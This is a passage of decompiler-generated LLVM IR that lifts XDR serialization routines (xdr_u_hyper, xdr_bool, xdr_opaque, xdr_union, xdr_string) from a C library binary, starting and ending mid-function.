  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10024298

dec_label_pc_10024298:                            ; preds = %dec_label_pc_10024230, %dec_label_pc_100241d0, %dec_label_pc_10024280, %dec_label_pc_10024210, %dec_label_pc_10024294
  %v0_1002429c = phi i32 [ 0, %dec_label_pc_10024230 ], [ 0, %dec_label_pc_100241d0 ], [ %v0_1002429c.pre, %dec_label_pc_10024280 ], [ 1, %dec_label_pc_10024210 ], [ 0, %dec_label_pc_10024294 ]
  store i32 %v0_100241a8, i32* %r0.global-to-local, align 4
  store i32 %v0_1002429c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1002429c

; uselistorder directives
  uselistorder i32 %v0_1002429c, { 1, 0 }
  uselistorder i32 %v0_100241b8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100241b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024298, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100242b4 = load i32, i32* @lr, align 4
  store i32 %v0_100242b4, i32* %r0.global-to-local, align 4
  %v0_100242bc = load i32, i32* @r4, align 4
  store i32 %v0_100242bc, i32* %r30.global-to-local, align 4
  %v0_100242c4 = load i32, i32* @r3, align 4
  store i32 %v0_100242c4, i32* %r31.global-to-local, align 4
  %v1_100242cc = inttoptr i32 %v0_100242c4 to i32*
  %v2_100242cc = load i32, i32* %v1_100242cc, align 4
  store i32 %v2_100242cc, i32* %r0.global-to-local, align 4
  %v3_100242d0 = icmp eq i32 %v2_100242cc, 0
  br i1 %v3_100242d0, label %dec_label_pc_100242dc, label %dec_label_pc_10024330

dec_label_pc_100242dc:                            ; preds = %entry
  %v1_100242dc = add i32 %v0_100242bc, 4
  %v2_100242dc = inttoptr i32 %v1_100242dc to i32*
  %v3_100242dc = load i32, i32* %v2_100242dc, align 4
  store i32 %v3_100242dc, i32* %r0.global-to-local, align 4
  %v1_100242e0 = inttoptr i32 %v0_100242bc to i32*
  %v2_100242e0 = load i32, i32* %v1_100242e0, align 4
  store i32 %v2_100242e0, i32* %r10.global-to-local, align 4
  %v1_100242e4 = add i32 %v0_100242c4, 4
  %v2_100242e4 = inttoptr i32 %v1_100242e4 to i32*
  %v3_100242e4 = load i32, i32* %v2_100242e4, align 4
  store i32 %v3_100242dc, i32* %stack_var_-20, align 4
  store i32 %v2_100242e0, i32* %stack_var_-24, align 4
  %v1_100242f0 = add i32 %v3_100242e4, 4
  %v2_100242f0 = inttoptr i32 %v1_100242f0 to i32*
  %v3_100242f0 = load i32, i32* %v2_100242f0, align 4
  call void @__pseudo_call(i32 %v3_100242f0)
  %v0_10024300 = load i32, i32* @r3, align 4
  %v3_10024300 = icmp eq i32 %v0_10024300, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10024308 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024308, i32* %r3.global-to-local, align 4
  br i1 %v3_10024300, label %dec_label_pc_10024398, label %dec_label_pc_10024310

dec_label_pc_10024310:                            ; preds = %dec_label_pc_100242dc
  %v1_10024310 = add i32 %v0_10024308, 4
  %v2_10024310 = inttoptr i32 %v1_10024310 to i32*
  %v3_10024310 = load i32, i32* %v2_10024310, align 4
  %v1_10024314 = add i32 %v3_10024310, 4
  %v2_10024314 = inttoptr i32 %v1_10024314 to i32*
  %v3_10024314 = load i32, i32* %v2_10024314, align 4
  call void @__pseudo_call(i32 %v3_10024314)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10024398

dec_label_pc_10024330:                            ; preds = %entry
  %v3_100242d4 = icmp eq i32 %v2_100242cc, 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100242d4, label %dec_label_pc_10024344, label %dec_label_pc_10024398

dec_label_pc_10024344:                            ; preds = %dec_label_pc_10024330
  %v1_10024344 = add i32 %v0_100242c4, 4
  %v2_10024344 = inttoptr i32 %v1_10024344 to i32*
  %v3_10024344 = load i32, i32* %v2_10024344, align 4
  %v1_10024348 = inttoptr i32 %v3_10024344 to i32*
  %v2_10024348 = load i32, i32* %v1_10024348, align 4
  call void @__pseudo_call(i32 %v2_10024348)
  %v0_10024358 = load i32, i32* @r3, align 4
  %v3_10024358 = icmp eq i32 %v0_10024358, 0
  %v0_1002435c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1002435c, i32* %r3.global-to-local, align 4
  br i1 %v3_10024358, label %dec_label_pc_10024394, label %dec_label_pc_10024364

dec_label_pc_10024364:                            ; preds = %dec_label_pc_10024344
  %v1_10024364 = add i32 %v0_1002435c, 4
  %v2_10024364 = inttoptr i32 %v1_10024364 to i32*
  %v3_10024364 = load i32, i32* %v2_10024364, align 4
  %v1_10024368 = inttoptr i32 %v3_10024364 to i32*
  %v2_10024368 = load i32, i32* %v1_10024368, align 4
  call void @__pseudo_call(i32 %v2_10024368)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10024378 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024378 = icmp eq i32 %v0_10024378, 0
  br i1 %v3_10024378, label %dec_label_pc_10024394, label %dec_label_pc_10024380

dec_label_pc_10024380:                            ; preds = %dec_label_pc_10024364
  %v3_10024380 = load i32, i32* %stack_var_-24, align 4
  %v3_10024384 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_10024384, i32* %r10.global-to-local, align 4
  %v1_10024388 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024388 = inttoptr i32 %v1_10024388 to i32*
  store i32 %v3_10024380, i32* %v2_10024388, align 4
  %v0_1002438c = load i32, i32* %r10.global-to-local, align 4
  %v1_1002438c = load i32, i32* %r30.global-to-local, align 4
  %v2_1002438c = add i32 %v1_1002438c, 4
  %v3_1002438c = inttoptr i32 %v2_1002438c to i32*
  store i32 %v0_1002438c, i32* %v3_1002438c, align 4
  %v0_10024398.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10024398

dec_label_pc_10024394:                            ; preds = %dec_label_pc_10024364, %dec_label_pc_10024344
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10024398

dec_label_pc_10024398:                            ; preds = %dec_label_pc_10024330, %dec_label_pc_100242dc, %dec_label_pc_10024380, %dec_label_pc_10024310, %dec_label_pc_10024394
  %v0_10024398 = phi i32 [ 0, %dec_label_pc_10024330 ], [ 0, %dec_label_pc_100242dc ], [ %v0_10024398.pre, %dec_label_pc_10024380 ], [ 1, %dec_label_pc_10024310 ], [ 0, %dec_label_pc_10024394 ]
  store i32 %v0_10024398, i32* %r3.global-to-local, align 4
  store i32 %v0_100242b4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10024398

; uselistorder directives
  uselistorder i32 %v0_10024398, { 1, 0 }
  uselistorder i32 %v0_100242c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100242bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024398, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_100243b0 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_100243b0
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_100243b4 = call i32 @xdr_u_hyper()
  ret i32 %v0_100243b4
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_100243d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100243d0 = inttoptr i32 %v0_100243d0 to i32*
  %v2_100243d0 = load i32, i32* %v1_100243d0, align 4
  %v3_100243d4 = icmp eq i32 %v2_100243d0, 1
  br i1 %v3_100243d4, label %dec_label_pc_10024410, label %dec_label_pc_100243e0

dec_label_pc_100243e0:                            ; preds = %entry
  %v1_100243d8 = icmp eq i32 %v2_100243d0, 0
  br i1 %v1_100243d8, label %dec_label_pc_100243f4, label %dec_label_pc_100243e8

dec_label_pc_100243e8:                            ; preds = %dec_label_pc_100243e0
  %v3_100243e0 = icmp eq i32 %v2_100243d0, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100243e0, label %dec_label_pc_1002443c, label %dec_label_pc_10024438

dec_label_pc_100243f4:                            ; preds = %dec_label_pc_100243e0
  %v1_100243f4 = inttoptr i32 %arg2 to i16*
  %v2_100243f4 = load i16, i16* %v1_100243f4, align 2
  %v1_100243f8 = add i32 %v0_100243d0, 4
  %v2_100243f8 = inttoptr i32 %v1_100243f8 to i32*
  %v3_100243f8 = load i32, i32* %v2_100243f8, align 4
  store i16 %v2_100243f4, i16* %stack_var_-24, align 2
  %v1_10024400 = add i32 %v3_100243f8, 4
  %v2_10024400 = inttoptr i32 %v1_10024400 to i32*
  %v3_10024400 = load i32, i32* %v2_10024400, align 4
  call void @__pseudo_call(i32 %v3_10024400)
  br label %dec_label_pc_1002443c

dec_label_pc_10024410:                            ; preds = %entry
  %v1_10024410 = add i32 %v0_100243d0, 4
  %v2_10024410 = inttoptr i32 %v1_10024410 to i32*
  %v3_10024410 = load i32, i32* %v2_10024410, align 4
  %v1_10024414 = inttoptr i32 %v3_10024410 to i32*
  %v2_10024414 = load i32, i32* %v1_10024414, align 4
  call void @__pseudo_call(i32 %v2_10024414)
  %v0_10024420 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024420 = icmp eq i32 %v0_10024420, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10024420, label %dec_label_pc_10024438, label %dec_label_pc_1002442c

dec_label_pc_1002442c:                            ; preds = %dec_label_pc_10024410
  %v3_1002442c = load i16, i16* %stack_var_-24, align 2
  %v2_10024430 = load i32, i32* %r31.global-to-local, align 4
  %v3_10024430 = inttoptr i32 %v2_10024430 to i16*
  store i16 %v3_1002442c, i16* %v3_10024430, align 2
  br label %dec_label_pc_1002443c

dec_label_pc_10024438:                            ; preds = %dec_label_pc_100243e8, %dec_label_pc_10024410
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002443c

dec_label_pc_1002443c:                            ; preds = %dec_label_pc_100243e8, %dec_label_pc_1002442c, %dec_label_pc_100243f4, %dec_label_pc_10024438
  %v0_1002444c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1002444c

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_1002443c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10024438, { 1, 0 }
}

define i32 @xdr_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_10024464 = load i8, i8* %arg1, align 1
  %v2_10024468 = ptrtoint i8* %stack_var_-24 to i32
  store i8 %v3_10024464, i8* %stack_var_-24, align 1
  store i32 268584052, i32* @lr, align 4
  %v1_10024470 = call i32 @__GI_xdr_int(i32 %v2_10024468)
  %v3_10024474 = icmp eq i32 %v1_10024470, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10024474, label %dec_label_pc_1002448c, label %dec_label_pc_10024480

dec_label_pc_10024480:                            ; preds = %entry
  %v3_10024480 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10024488 = load i32, i32* %r31.global-to-local, align 4
  %v3_10024488 = inttoptr i32 %v2_10024488 to i8*
  store i8 %v3_10024480, i8* %v3_10024488, align 1
  %v0_1002449c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002448c

dec_label_pc_1002448c:                            ; preds = %entry, %dec_label_pc_10024480
  %v0_1002449c = phi i32 [ 0, %entry ], [ %v0_1002449c.pre, %dec_label_pc_10024480 ]
  ret i32 %v0_1002449c

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1002448c, { 1, 0 }
}

define i32 @xdr_u_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* @r31, align 4
  %v3_100244b4 = load i8, i8* %arg1, align 1
  %v2_100244b8 = ptrtoint i8* %stack_var_-24 to i32
  store i32 %v2_100244b8, i32* @r4, align 4
  store i8 %v3_100244b4, i8* %stack_var_-24, align 1
  store i32 268584132, i32* @lr, align 4
  %v2_100244c0 = bitcast i8* %stack_var_-24 to i32*
  %v4_100244c0 = call i32 @xdr_u_int(i32* %v2_100244c0, i32* %v2_100244c0)
  %v3_100244c4 = icmp eq i32 %v4_100244c0, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100244c4, label %dec_label_pc_100244dc, label %dec_label_pc_100244d0

dec_label_pc_100244d0:                            ; preds = %entry
  %v3_100244d0 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_100244d8 = load i32, i32* @r31, align 4
  %v3_100244d8 = inttoptr i32 %v2_100244d8 to i8*
  store i8 %v3_100244d0, i8* %v3_100244d8, align 1
  %v0_100244ec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100244dc

dec_label_pc_100244dc:                            ; preds = %entry, %dec_label_pc_100244d0
  %v0_100244ec = phi i32 [ 0, %entry ], [ %v0_100244ec.pre, %dec_label_pc_100244d0 ]
  ret i32 %v0_100244ec

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_100244dc, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_10024508 = load i32, i32* %r3.global-to-local, align 4
  %v1_10024508 = inttoptr i32 %v0_10024508 to i32*
  %v2_10024508 = load i32, i32* %v1_10024508, align 4
  %v3_1002450c = icmp eq i32 %v2_10024508, 1
  br i1 %v3_1002450c, label %dec_label_pc_10024550, label %dec_label_pc_10024518

dec_label_pc_10024518:                            ; preds = %entry
  %v1_10024510 = icmp eq i32 %v2_10024508, 0
  br i1 %v1_10024510, label %dec_label_pc_1002452c, label %dec_label_pc_10024520

dec_label_pc_10024520:                            ; preds = %dec_label_pc_10024518
  %v3_10024518 = icmp eq i32 %v2_10024508, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10024518, label %dec_label_pc_10024584, label %dec_label_pc_10024580

dec_label_pc_1002452c:                            ; preds = %dec_label_pc_10024518
  %v1_1002452c = inttoptr i32 %arg2 to i32*
  %v2_1002452c = load i32, i32* %v1_1002452c, align 4
  %v1_10024530 = add i32 %v0_10024508, 4
  %v2_10024530 = inttoptr i32 %v1_10024530 to i32*
  %v3_10024530 = load i32, i32* %v2_10024530, align 4
  %v2_10024534 = icmp ne i32 %v2_1002452c, 0
  %v5_10024538 = zext i1 %v2_10024534 to i32
  store i32 %v5_10024538, i32* %stack_var_-24, align 4
  %v1_10024540 = add i32 %v3_10024530, 4
  %v2_10024540 = inttoptr i32 %v1_10024540 to i32*
  %v3_10024540 = load i32, i32* %v2_10024540, align 4
  call void @__pseudo_call(i32 %v3_10024540)
  br label %dec_label_pc_10024584

dec_label_pc_10024550:                            ; preds = %entry
  %v1_10024550 = add i32 %v0_10024508, 4
  %v2_10024550 = inttoptr i32 %v1_10024550 to i32*
  %v3_10024550 = load i32, i32* %v2_10024550, align 4
  %v1_10024554 = inttoptr i32 %v3_10024550 to i32*
  %v2_10024554 = load i32, i32* %v1_10024554, align 4
  call void @__pseudo_call(i32 %v2_10024554)
  %v0_10024560 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024560 = icmp eq i32 %v0_10024560, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10024560, label %dec_label_pc_10024580, label %dec_label_pc_1002456c

dec_label_pc_1002456c:                            ; preds = %dec_label_pc_10024550
  %v3_1002456c = load i32, i32* %stack_var_-24, align 4
  %v2_10024570 = icmp ne i32 %v3_1002456c, 0
  %v5_10024574 = zext i1 %v2_10024570 to i32
  %v1_10024578 = load i32, i32* %r31.global-to-local, align 4
  %v2_10024578 = inttoptr i32 %v1_10024578 to i32*
  store i32 %v5_10024574, i32* %v2_10024578, align 4
  br label %dec_label_pc_10024584

dec_label_pc_10024580:                            ; preds = %dec_label_pc_10024520, %dec_label_pc_10024550
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024584

dec_label_pc_10024584:                            ; preds = %dec_label_pc_10024520, %dec_label_pc_1002456c, %dec_label_pc_1002452c, %dec_label_pc_10024580
  %v0_10024594 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10024594

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_10024584, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10024580, { 1, 0 }
}

define i32 @xdr_enum() local_unnamed_addr {
entry:
  %v0_10024598 = call i32 @__GI_xdr_long()
  ret i32 %v0_10024598
}

define i32 @xdr_opaque(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100245a4 = load i32, i32* @r5, align 4
  %v3_100245a4 = icmp eq i32 %v0_100245a4, 0
  store i32 %tmp, i32* @r31, align 4
  br i1 %v3_100245a4, label %dec_label_pc_10024670, label %dec_label_pc_100245b8

dec_label_pc_100245b8:                            ; preds = %entry
  %v1_100245b8 = urem i32 %v0_100245a4, 4
  %v3_100245b8 = icmp eq i32 %v1_100245b8, 0
  %v1_100245c4 = sub nsw i32 4, %v1_100245b8
  %.v1_100245c4 = select i1 %v3_100245b8, i32 0, i32 %v1_100245c4
  store i32 %.v1_100245c4, i32* @r30, align 4
  %v2_100245c8 = load i32, i32* %arg1, align 4
  %v3_100245cc = icmp eq i32 %v2_100245c8, 1
  br i1 %v3_100245cc, label %dec_label_pc_100245e8, label %dec_label_pc_100245d4

dec_label_pc_100245d4:                            ; preds = %dec_label_pc_100245b8
  %v1_100245d4 = icmp eq i32 %v2_100245c8, 0
  br i1 %v1_100245d4, label %dec_label_pc_10024628, label %dec_label_pc_100245dc

dec_label_pc_100245dc:                            ; preds = %dec_label_pc_100245d4
  %v3_100245dc = icmp eq i32 %v2_100245c8, 2
  br i1 %v3_100245dc, label %dec_label_pc_10024670, label %dec_label_pc_10024678

dec_label_pc_100245e8:                            ; preds = %dec_label_pc_100245b8
  %v1_100245e8 = add i32 %tmp, 4
  %v2_100245e8 = inttoptr i32 %v1_100245e8 to i32*
  %v3_100245e8 = load i32, i32* %v2_100245e8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100245f0 = add i32 %v3_100245e8, 8
  %v2_100245f0 = inttoptr i32 %v1_100245f0 to i32*
  %v3_100245f0 = load i32, i32* %v2_100245f0, align 4
  call void @__pseudo_call(i32 %v3_100245f0)
  %v3_100245fc = icmp eq i32* %arg1, null
  br i1 %v3_100245fc, label %dec_label_pc_10024678, label %dec_label_pc_10024604

dec_label_pc_10024604:                            ; preds = %dec_label_pc_100245e8
  %v0_10024604 = load i32, i32* @r30, align 4
  %v3_10024604 = icmp eq i32 %v0_10024604, 0
  br i1 %v3_10024604, label %dec_label_pc_10024670, label %dec_label_pc_1002460c

dec_label_pc_1002460c:                            ; preds = %dec_label_pc_10024604
  %v0_1002460c = load i32, i32* @r31, align 4
  %v1_1002460c = add i32 %v0_1002460c, 4
  %v2_1002460c = inttoptr i32 %v1_1002460c to i32*
  %v3_1002460c = load i32, i32* %v2_1002460c, align 4
  store i32 %v0_1002460c, i32* %r3.global-to-local, align 4
  %v1_1002461c = add i32 %v3_1002460c, 8
  br label %dec_label_pc_10024664

dec_label_pc_10024628:                            ; preds = %dec_label_pc_100245d4
  %v1_10024628 = add i32 %tmp, 4
  %v2_10024628 = inttoptr i32 %v1_10024628 to i32*
  %v3_10024628 = load i32, i32* %v2_10024628, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10024630 = add i32 %v3_10024628, 12
  %v2_10024630 = inttoptr i32 %v1_10024630 to i32*
  %v3_10024630 = load i32, i32* %v2_10024630, align 4
  call void @__pseudo_call(i32 %v3_10024630)
  %v3_1002463c = icmp eq i32* %arg1, null
  br i1 %v3_1002463c, label %dec_label_pc_10024678, label %dec_label_pc_10024644

dec_label_pc_10024644:                            ; preds = %dec_label_pc_10024628
  %v0_10024644 = load i32, i32* @r30, align 4
  %v3_10024644 = icmp eq i32 %v0_10024644, 0
  br i1 %v3_10024644, label %dec_label_pc_10024670, label %dec_label_pc_1002464c

dec_label_pc_1002464c:                            ; preds = %dec_label_pc_10024644
  %v0_1002464c = load i32, i32* @r31, align 4
  %v1_1002464c = add i32 %v0_1002464c, 4
  %v2_1002464c = inttoptr i32 %v1_1002464c to i32*
  %v3_1002464c = load i32, i32* %v2_1002464c, align 4
  store i32 %v0_1002464c, i32* %r3.global-to-local, align 4
  %v1_1002465c = add i32 %v3_1002464c, 12
  br label %dec_label_pc_10024664

dec_label_pc_10024664:                            ; preds = %dec_label_pc_1002460c, %dec_label_pc_1002464c
  %storemerge1.in.in = phi i32 [ %v1_1002465c, %dec_label_pc_1002464c ], [ %v1_1002461c, %dec_label_pc_1002460c ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  call void @__pseudo_call(i32 %storemerge1)
  %v0_1002468c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002467c

dec_label_pc_10024670:                            ; preds = %dec_label_pc_100245dc, %dec_label_pc_10024644, %dec_label_pc_10024604, %entry
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002467c

dec_label_pc_10024678:                            ; preds = %dec_label_pc_100245dc, %dec_label_pc_10024628, %dec_label_pc_100245e8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002467c

dec_label_pc_1002467c:                            ; preds = %dec_label_pc_10024670, %dec_label_pc_10024664, %dec_label_pc_10024678
  %v0_1002468c = phi i32 [ 1, %dec_label_pc_10024670 ], [ %v0_1002468c.pre, %dec_label_pc_10024664 ], [ 0, %dec_label_pc_10024678 ]
  ret i32 %v0_1002468c

; uselistorder directives
  uselistorder i32 %v1_100245b8, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 3, 4, 6, 7, 0 }
  uselistorder i32* null, { 1, 0, 5, 3, 2, 6, 7, 8, 4 }
  uselistorder i32* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1002467c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10024678, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10024670, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10024664, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg5, i32* %r28.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268584632, i32* @lr, align 4
  %v0_100246b4 = call i32 @xdr_enum()
  %v3_100246b8 = icmp eq i32 %v0_100246b4, 0
  br i1 %v3_100246b8, label %dec_label_pc_1002471c, label %dec_label_pc_100246c0

dec_label_pc_100246c0:                            ; preds = %entry
  %v0_100246c0 = load i32, i32* @r30, align 4
  %v1_100246c0 = inttoptr i32 %v0_100246c0 to i32*
  %v2_100246c0 = load i32, i32* %v1_100246c0, align 4
  %v0_100246d8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100246d8

dec_label_pc_100246c8:                            ; preds = %dec_label_pc_100246d8
  %v1_100246c8 = inttoptr i32 %v0_100246c8 to i32*
  %v2_100246c8 = load i32, i32* %v1_100246c8, align 4
  %v1_100246cc = add i32 %v0_100246c8, 8
  %v4_100246d0 = icmp eq i32 %v2_100246c8, %v2_100246c0
  br i1 %v4_100246d0, label %dec_label_pc_10024710.loopexit, label %dec_label_pc_100246d8

dec_label_pc_100246d8:                            ; preds = %dec_label_pc_100246c8, %dec_label_pc_100246c0
  %v0_100246c8 = phi i32 [ %v1_100246cc, %dec_label_pc_100246c8 ], [ %v0_100246d8.pre, %dec_label_pc_100246c0 ]
  %v1_100246d8 = add i32 %v0_100246c8, 4
  %v2_100246d8 = inttoptr i32 %v1_100246d8 to i32*
  %v3_100246d8 = load i32, i32* %v2_100246d8, align 4
  %v3_100246dc = icmp eq i32 %v3_100246d8, 0
  br i1 %v3_100246dc, label %dec_label_pc_100246e4, label %dec_label_pc_100246c8

dec_label_pc_100246e4:                            ; preds = %dec_label_pc_100246d8
  %v0_100246e4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100246e4 = icmp eq i32 %v0_100246e4, 0
  br i1 %v3_100246e4, label %dec_label_pc_1002471c, label %dec_label_pc_10024710

dec_label_pc_10024710.loopexit:                   ; preds = %dec_label_pc_100246c8
  br label %dec_label_pc_10024710

dec_label_pc_10024710:                            ; preds = %dec_label_pc_10024710.loopexit, %dec_label_pc_100246e4
  %storemerge2 = phi i32 [ %v0_100246e4, %dec_label_pc_100246e4 ], [ %v3_100246d8, %dec_label_pc_10024710.loopexit ]
  %storemerge1 = load i32, i32* %r29.global-to-local, align 4
  call void @__pseudo_call(i32 %storemerge2)
  br label %dec_label_pc_10024720

dec_label_pc_1002471c:                            ; preds = %dec_label_pc_100246e4, %entry
  br label %dec_label_pc_10024720

dec_label_pc_10024720:                            ; preds = %dec_label_pc_10024710, %dec_label_pc_1002471c
  %v0_10024730 = phi i32 [ %storemerge1, %dec_label_pc_10024710 ], [ 0, %dec_label_pc_1002471c ]
  ret i32 %v0_10024730

; uselistorder directives
  uselistorder i32 %v0_100246c8, { 2, 0, 1 }
  uselistorder i32 ()* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_10024720, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v0_10024748 = load i32, i32* @r4, align 4
  store i32 %v0_10024748, i32* @r29, align 4
  %v0_1002474c = load i32, i32* @r5, align 4
  store i32 %v0_1002474c, i32* %r28.global-to-local, align 4
  %v2_10024750 = load i32, i32* %arg1, align 4
  %v1_10024754 = inttoptr i32 %v0_10024748 to i32*
  %v2_10024754 = load i32, i32* %v1_10024754, align 4
  store i32 %v2_10024754, i32* @r31, align 4
  %v3_10024758 = icmp eq i32 %v2_10024750, 0
  br i1 %v3_10024758, label %dec_label_pc_10024770, label %dec_label_pc_10024760

dec_label_pc_10024760:                            ; preds = %entry
  %v3_10024760 = icmp eq i32 %v2_10024750, 2
  br i1 %v3_10024760, label %dec_label_pc_10024768, label %dec_label_pc_10024784

dec_label_pc_10024768:                            ; preds = %dec_label_pc_10024760
  %v3_10024768 = icmp eq i32 %v2_10024754, 0
  br i1 %v3_10024768, label %dec_label_pc_10024838, label %dec_label_pc_10024770.thread

dec_label_pc_10024770.thread:                     ; preds = %dec_label_pc_10024768
  br label %dec_label_pc_10024778

dec_label_pc_10024770:                            ; preds = %entry
  %v3_10024770 = icmp eq i32 %v2_10024754, 0
  br i1 %v3_10024770, label %dec_label_pc_10024840, label %dec_label_pc_10024778

dec_label_pc_10024778:                            ; preds = %dec_label_pc_10024770.thread, %dec_label_pc_10024770
  store i32 %v2_10024754, i32* @r3, align 4
  %v0_1002477c = call i32 @__GI_strlen()
  store i32 %v0_1002477c, i32* %r3.global-to-local, align 4
  store i32 %v0_1002477c, i32* %stack_var_-40, align 4
  %v0_10024784.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10024784

dec_label_pc_10024784:                            ; preds = %dec_label_pc_10024760, %dec_label_pc_10024778
  %v0_10024784 = phi i32 [ %tmp, %dec_label_pc_10024760 ], [ %v0_10024784.pre, %dec_label_pc_10024778 ]
  store i32 %v0_10024784, i32* @r3, align 4
  %v2_10024788 = ptrtoint i32* %stack_var_-40 to i32
